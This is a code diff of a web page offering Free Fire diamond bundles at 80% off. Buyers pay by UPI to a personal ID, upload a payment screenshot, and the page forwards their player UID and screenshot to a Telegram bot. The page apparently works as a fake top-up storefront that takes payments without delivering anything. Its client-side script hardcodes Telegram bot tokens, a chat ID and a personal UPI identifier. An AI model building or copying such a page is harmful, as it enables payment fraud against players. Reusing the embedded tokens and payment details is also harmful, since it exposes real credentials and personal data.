@@ -39,27 +39,22 @@ body { background-color: #070912; color: #ffffff; font-family: 'Inter', sans-ser
         <div class="card-pro p-5 text-center" onclick="select(this, '5600 💎 Bundle', 800)"><div class="badge-discount">80% OFF</div><img src="Screenshot_20260404-182232_Free Fire MAX~8.png" class="bundle-img"><p class="font-black italic text-sm">5600 💎</p><p class="text-[10px] text-gray-500 line-through">₹4,000.00</p><div class="price-tag">₹800.00</div></div>
     </div>
 
-    <button onclick="openPay()" class="w-full bg-cyan-500 text-black py-5 rounded-2xl text-xl font-black shadow-lg shadow-cyan-500/20 uppercase">Checkout Now</button>
+    <button onclick="openPay()" class="w-full bg-cyan-500 text-black py-5 rounded-2xl text-xl font-black shadow-lg">Checkout Now</button>
 </main>
 
 <div id="payment-overlay">
     <div class="p-6 flex items-center border-b border-white/5 bg-white/5">
         <button onclick="closePay()" class="text-cyan-400 mr-4"><i class="fas fa-times"></i></button>
-        <span class="ff-font text-xl uppercase italic">Secure Payment</span>
+        <span class="ff-font text-xl italic uppercase">Secure Payment</span>
     </div>
     <div class="p-8 text-center space-y-8">
         <div><p id="item-name" class="text-gray-500 text-xs font-bold uppercase"></p><h3 id="item-price" class="text-6xl font-black text-cyan-400 ff-font mt-1"></h3></div>
-        
-        <div class="bg-white p-4 rounded-2xl inline-block shadow-2xl">
-            <img src="Screenshot_20260405-074910_GPay.png" class="w-64 h-auto rounded-lg">
-        </div>
-
+        <div class="bg-white p-4 rounded-2xl inline-block shadow-2xl"><img src="Screenshot_20260405-074910_GPay.png" class="w-64 h-auto rounded-lg"></div>
         <div class="space-y-4">
             <p class="text-cyan-500 font-bold tracking-widest">UPI ID: 8860269931@ybl</p>
             <input type="file" id="proof" class="hidden" onchange="updateFileLabel(this)">
-            <label for="proof" id="file-label" class="block p-6 bg-black/40 border-2 border-dashed border-white/10 rounded-2xl cursor-pointer hover:border-cyan-500/50 transition-all">
-                <i class="fas fa-camera text-2xl text-gray-600 mb-2"></i>
-                <p class="text-xs text-gray-500 font-bold uppercase">Upload Screenshot</p>
+            <label for="proof" id="file-label" class="block p-6 bg-black/40 border-2 border-dashed border-white/10 rounded-2xl cursor-pointer">
+                <p class="text-xs text-gray-500 font-bold uppercase">Upload Payment Screenshot</p>
             </label>
             <button id="submit-btn" onclick="finish()" class="w-full bg-green-500 text-white py-5 rounded-2xl font-black uppercase text-sm shadow-xl">Submit Order</button>
         </div>
@@ -67,10 +62,10 @@ body { background-color: #070912; color: #ffffff; font-family: 'Inter', sans-ser
 </div>
 
 <script>
-// --- TELEGRAM CONFIG ---
-const BOT_TOKEN = "8708010864:AAEo230uiWpoXi-hqoUVu9SbABX_agefrGQ"; 
+// --- CONFIGURATION ---
+const BOT_TOKEN = "8708010864:AAEyphp9o30lcISSPunHLsWC7gtYyNon4EnE"; 
 const CHAT_ID = "6097759794"; 
-// -----------------------
+// --------------------
 
 let selected = null;
 function select(el, pack, price) {
@@ -78,37 +73,28 @@ function select(el, pack, price) {
     el.classList.add('selected');
     selected = { pack, price };
 }
-
 function openPay() {
     const u = document.getElementById('uid').value;
-    if(!u || u.length < 5) return alert("❌ Enter Valid Player UID!");
-    if(!selected) return alert("💎 Please select a Diamond Bundle!");
+    if(!u || u.length < 5) return alert("❌ Valid UID dalien");
+    if(!selected) return alert("💎 Pack select karein");
     document.getElementById('item-name').innerText = selected.pack;
     document.getElementById('item-price').innerText = "₹" + selected.price;
     document.getElementById('payment-overlay').style.display = "block";
 }
-
-function closePay() {
-    document.getElementById('payment-overlay').style.display = "none";
-}
-
-function updateFileLabel(input) {
-    if(input.files[0]) {
-        document.getElementById('file-label').innerHTML = `<i class="fas fa-check-circle text-2xl text-green-500 mb-2"></i><p class="text-green-500 font-bold uppercase text-xs">Screenshot Selected ✅</p>`;
-    }
-}
+function closePay() { document.getElementById('payment-overlay').style.display = "none"; }
+function updateFileLabel(input) { if(input.files[0]) document.getElementById('file-label').innerHTML = `<p class="text-green-400 font-bold uppercase text-xs">Selected ✅</p>`; }
 
 async function finish() {
     const uid = document.getElementById('uid').value;
     const proof = document.getElementById('proof').files[0];
     const btn = document.getElementById('submit-btn');
 
-    if(!proof) return alert("📸 Please upload payment screenshot first!");
+    if(!proof) return alert("📸 Screenshot upload karein!");
     
-    btn.innerText = "SENDING ORDER...";
+    btn.innerText = "SENDING...";
     btn.disabled = true;
 
-    const text = `🔥 NEW TOP-UP ORDER! 🔥\n\n🆔 UID: ${uid}\n💎 Package: ${selected.pack}\n💰 Amount Paid: ₹${selected.price}\n\n✅ Check screenshot below.`;
+    const text = `🔥 NEW ORDER! 🔥\n\n🆔 UID: ${uid}\n💎 Pack: ${selected.pack}\n💰 Amount: ₹${selected.price}`;
     
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
@@ -116,16 +102,22 @@ async function finish() {
     formData.append('photo', proof);
 
     try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
         });
-        alert("✅ Order Sent Successfully! Credits will arrive in 15 mins.");
-        location.reload();
+        const data = await res.json();
+        
+        if(data.ok) {
+            alert("✅ Order Sent! Check your Bot.");
+            location.reload();
+        } else {
+            alert("❌ Error: " + data.description);
+            btn.disabled = false;
+        }
     } catch (err) {
-        alert("❌ Failed to send order. Contact admin.");
+        alert("❌ Network Error!");
         btn.disabled = false;
-        btn.innerText = "Submit Order";
     }
 }
 </script>
